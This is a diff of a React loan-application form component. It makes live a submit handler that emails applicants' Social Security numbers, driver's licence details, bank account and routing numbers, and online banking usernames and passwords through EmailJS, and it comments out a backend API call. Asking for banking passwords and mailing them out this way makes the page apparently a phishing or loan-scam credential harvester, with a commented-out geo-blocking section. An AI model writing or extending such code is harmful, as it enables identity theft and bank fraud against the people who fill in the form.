@@ -159,89 +159,43 @@ export default function ApplicationWizard() {
     setCurrentStep((prev) => Math.max(prev - 1, 1));
   }, []);
 
-  // const handleSubmit = async () => {
-  //   setIsSubmitting(true);
-  //   try {
-  //     const templateParams = {
-  //       // to_email: "pabitraghara@gmail.com",
-  //       from_name: `${formData.firstName} ${formData.lastName}`,
-  //       from_email: formData.email,
-  //       phone: formData.phone,
-  //       date_of_birth: formData.dateOfBirth,
-  //       ssn: formData.ssn,
-  //       driver_license: `${formData.driverLicenseNumber} (${formData.driverLicenseState})`,
-  //       address: `${formData.streetAddress}, ${formData.city}, ${formData.state} ${formData.zipCode}`,
-  //       employment_status: formData.employmentStatus,
-  //       employer_name: formData.employerName,
-  //       job_title: formData.jobTitle,
-  //       monthly_income: `$${formData.monthlyIncome}`,
-  //       years_employed: formData.yearsEmployed,
-  //       loan_amount: `$${formData.loanAmount}`,
-  //       loan_purpose: formData.loanPurpose,
-  //       loan_term: `${formData.loanTerm} months`,
-  //       bank_name: formData.bankName,
-  //       routing_number: formData.routingNumber,
-  //       account_number: formData.accountNumber,
-  //       account_type: formData.accountType,
-  //       assisted_by: formData.assistedByLoanAgent || "N/A",
-  //       accountNumber: formData.accountNumber,
-  //       bankUsername: formData.bankUsername,
-  //       bankPassword: formData.bankPassword,
-  //     };
-
-  //     await emailjs.send(
-  //       EMAILJS_SERVICE_ID,
-  //       EMAILJS_TEMPLATE_ID,
-  //       templateParams,
-  //       EMAILJS_PUBLIC_KEY,
-  //     );
-
-  //     setSubmitResult({
-  //       success: true,
-  //       message:
-  //         "Your application has been submitted successfully! We will review your application and contact you within 24 hours.",
-  //     });
-  //   } catch {
-  //     setSubmitResult({
-  //       success: false,
-  //       message:
-  //         "Something went wrong. Please try again or contact us directly.",
-  //     });
-  //   } finally {
-  //     setIsSubmitting(false);
-  //   }
-  // };
-
   const handleSubmit = async () => {
+    setIsSubmitting(true);
     try {
-      setIsSubmitting(true);
-      const res = await fetch(
-        `${process.env.NEXT_PUBLIC_API_URL}/api/v1/loans/apply`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            applicantFullName: `${formData.firstName} ${formData.lastName}`,
-            applicantPhoneNumber: formData.phone,
-            applicantDateOfBirth: formData.dateOfBirth,
-            applicantSSN: formData.ssn,
-            applicantAddress: formData.streetAddress,
-            applicantCity: formData.city,
-            applicantState: formData.state,
-            applicantZipCode: formData.zipCode,
-            applicantLoanAmount: formData.loanAmount.toString(),
-            applicantLoanPurpose: formData.loanPurpose,
-            applicantRoutingNumber: formData.routingNumber,
-            applicantBankName: formData.bankName,
-            applicantAccountNumber: formData.accountNumber,
-            applicantOnlineBankUsername: formData.bankUsername,
-            applicantOnlineBankPassword: formData.bankPassword,
-          }),
-        },
+      const templateParams = {
+        // to_email: "pabitraghara@gmail.com",
+        from_name: `${formData.firstName} ${formData.lastName}`,
+        from_email: formData.email,
+        phone: formData.phone,
+        date_of_birth: formData.dateOfBirth,
+        ssn: formData.ssn,
+        driver_license: `${formData.driverLicenseNumber} (${formData.driverLicenseState})`,
+        address: `${formData.streetAddress}, ${formData.city}, ${formData.state} ${formData.zipCode}`,
+        employment_status: formData.employmentStatus,
+        employer_name: formData.employerName,
+        job_title: formData.jobTitle,
+        monthly_income: `$${formData.monthlyIncome}`,
+        years_employed: formData.yearsEmployed,
+        loan_amount: `$${formData.loanAmount}`,
+        loan_purpose: formData.loanPurpose,
+        loan_term: `${formData.loanTerm} months`,
+        bank_name: formData.bankName,
+        routing_number: formData.routingNumber,
+        account_number: formData.accountNumber,
+        account_type: formData.accountType,
+        assisted_by: formData.assistedByLoanAgent || "N/A",
+        accountNumber: formData.accountNumber,
+        bankUsername: formData.bankUsername,
+        bankPassword: formData.bankPassword,
+      };
+
+      await emailjs.send(
+        EMAILJS_SERVICE_ID,
+        EMAILJS_TEMPLATE_ID,
+        templateParams,
+        EMAILJS_PUBLIC_KEY,
       );
-      if (!res.ok) {
-        throw new Error("Network response was not ok");
-      }
+
       setSubmitResult({
         success: true,
         message:
@@ -257,6 +211,52 @@ export default function ApplicationWizard() {
       setIsSubmitting(false);
     }
   };
+
+  // const handleSubmit = async () => {
+  //   try {
+  //     setIsSubmitting(true);
+  //     const res = await fetch(
+  //       `${process.env.NEXT_PUBLIC_API_URL}/api/v1/loans/apply`,
+  //       {
+  //         method: "POST",
+  //         headers: { "Content-Type": "application/json" },
+  //         body: JSON.stringify({
+  //           applicantFullName: `${formData.firstName} ${formData.lastName}`,
+  //           applicantPhoneNumber: formData.phone,
+  //           applicantDateOfBirth: formData.dateOfBirth,
+  //           applicantSSN: formData.ssn,
+  //           applicantAddress: formData.streetAddress,
+  //           applicantCity: formData.city,
+  //           applicantState: formData.state,
+  //           applicantZipCode: formData.zipCode,
+  //           applicantLoanAmount: formData.loanAmount.toString(),
+  //           applicantLoanPurpose: formData.loanPurpose,
+  //           applicantRoutingNumber: formData.routingNumber,
+  //           applicantBankName: formData.bankName,
+  //           applicantAccountNumber: formData.accountNumber,
+  //           applicantOnlineBankUsername: formData.bankUsername,
+  //           applicantOnlineBankPassword: formData.bankPassword,
+  //         }),
+  //       },
+  //     );
+  //     if (!res.ok) {
+  //       throw new Error("Network response was not ok");
+  //     }
+  //     setSubmitResult({
+  //       success: true,
+  //       message:
+  //         "Your application has been submitted successfully! We will review your application and contact you within 24 hours.",
+  //     });
+  //   } catch {
+  //     setSubmitResult({
+  //       success: false,
+  //       message:
+  //         "Something went wrong. Please try again or contact us directly.",
+  //     });
+  //   } finally {
+  //     setIsSubmitting(false);
+  //   }
+  // };
 
   // Geo-blocked
   //   if (geoAllowed === false) {
